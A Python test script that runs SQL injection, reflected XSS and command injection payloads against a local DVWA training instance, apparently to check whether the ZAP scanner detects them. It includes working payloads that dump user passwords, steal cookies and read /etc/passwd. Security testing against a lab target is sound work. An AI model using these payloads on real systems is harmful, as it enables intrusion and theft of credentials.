#!/usr/bin/env python3
"""
Manual DVWA vulnerability testing to confirm vulnerabilities exist.
Tests SQLi, XSS, Command Injection directly without ZAP.
"""

import subprocess
import re

print("="*80)
print("MANUAL DVWA VULNERABILITY TESTING")
print("="*80)

# Start Docker if needed
print("\n[1/5] Checking Docker containers...")
result = subprocess.run(['docker', 'ps'], capture_output=True, text=True)
if result.returncode != 0:
    print("! Docker not running, starting...")
    subprocess.run(['open', '-a', 'Docker'])
    import time
    time.sleep(10)

# Get authenticated session
print("\n[2/5] Getting authenticated PHPSESSID...")
result = subprocess.run([
    'curl', '-s', '-c', '-',
    '-d', 'username=admin&password=password&Login=Login',
    'http://localhost:8080/login.php'
], capture_output=True, text=True)

phpsessid = None
for line in result.stdout.split('\n'):
    if 'PHPSESSID' in line:
        parts = line.split()
        if len(parts) >= 7:
            phpsessid = parts[6]
            break

if not phpsessid:
    print("✗ Failed to get PHPSESSID")
    print("  Make sure DVWA is running: docker-compose up -d")
    exit(1)

print(f"✓ Got PHPSESSID: {phpsessid}")

# Set security to low
subprocess.run([
    'curl', '-s',
    '-b', f'PHPSESSID={phpsessid}',
    '-d', 'security=low&seclev_submit=Submit',
    'http://localhost:8080/security.php'
], capture_output=True)
print("✓ Set security=low")

print("\n[3/5] Testing SQL Injection...")
print("-" * 80)

# Test 1: Basic SQLi
sqli_payloads = [
    ("1' OR '1'='1", "Should return all users"),
    ("1' UNION SELECT user,password FROM users--", "Should extract user/password"),
    ("1' AND 1=2 UNION SELECT database(),version()--", "Should show DB info"),
]

for payload, description in sqli_payloads:
    result = subprocess.run([
        'curl', '-s',
        '-b', f'PHPSESSID={phpsessid}; security=low',
        f'http://localhost:8080/vulnerabilities/sqli/?id={payload}&Submit=Submit'
    ], capture_output=True, text=True)

    # Check for SQL injection success indicators
    if 'Surname:' in result.stdout:
        matches = re.findall(r'First name: (.*?)<br>Surname: (.*?)<br>', result.stdout)
        if len(matches) > 1:  # More than one result = SQLi worked
            print(f"  ✓ SQLi WORKS: {description}")
            print(f"    Payload: {payload}")
            print(f"    Results: {len(matches)} rows returned")
            for i, (first, last) in enumerate(matches[:3]):
                print(f"      Row {i+1}: {first} {last}")
        else:
            print(f"  - Single result: {description}")
    elif 'error' in result.stdout.lower() or 'mysql' in result.stdout.lower():
        print(f"  ! SQL error (may indicate injection): {description}")
    else:
        print(f"  ✗ No results: {description}")

print("\n[4/5] Testing Cross-Site Scripting (XSS)...")
print("-" * 80)

xss_payloads = [
    ("<script>alert(1)</script>", "Basic XSS"),
    ("<img src=x onerror=alert(1)>", "Image XSS"),
    ("'><script>alert(document.cookie)</script>", "Cookie XSS"),
]

for payload, description in xss_payloads:
    result = subprocess.run([
        'curl', '-s',
        '-b', f'PHPSESSID={phpsessid}; security=low',
        '--data-urlencode', f'name={payload}',
        'http://localhost:8080/vulnerabilities/xss_r/'
    ], capture_output=True, text=True)

    # Check if payload is reflected without encoding
    if payload in result.stdout:
        print(f"  ✓ XSS WORKS: {description}")
        print(f"    Payload reflected unencoded: {payload}")
    elif '&lt;script&gt;' in result.stdout or '&lt;img' in result.stdout:
        print(f"  ✗ Payload encoded: {description}")
    else:
        print(f"  - Not reflected: {description}")

print("\n[5/5] Testing Command Injection...")
print("-" * 80)

cmd_payloads = [
    ("127.0.0.1; whoami", "Should show current user"),
    ("127.0.0.1 && cat /etc/passwd", "Should show passwd file"),
    ("127.0.0.1 | ls -la", "Should show directory listing"),
]

for payload, description in cmd_payloads:
    result = subprocess.run([
        'curl', '-s',
        '-b', f'PHPSESSID={phpsessid}; security=low',
        '--data-urlencode', f'ip={payload}',
        '-d', 'Submit=Submit',
        'http://localhost:8080/vulnerabilities/exec/'
    ], capture_output=True, text=True)

    # Check for command injection success
    if 'www-data' in result.stdout or 'root:' in result.stdout or 'drwx' in result.stdout:
        print(f"  ✓ CMD INJECTION WORKS: {description}")
        print(f"    Payload: {payload}")
        # Show first few lines of output
        lines = result.stdout.split('\n')
        for line in lines[:5]:
            if line.strip() and 'PING' not in line:
                print(f"      {line.strip()[:80]}")
    else:
        print(f"  - No command output: {description}")

print("\n" + "="*80)
print("SUMMARY")
print("="*80)
print("\nIf vulnerabilities work manually but ZAP doesn't find them:")
print("  → ZAP Active Scanner is not compatible with DVWA")
print("  → Need to manually inject test data for chain detection")
print("\nIf vulnerabilities DON'T work manually:")
print("  → DVWA security=low has issues")
print("  → Need different test application")
print("="*80)
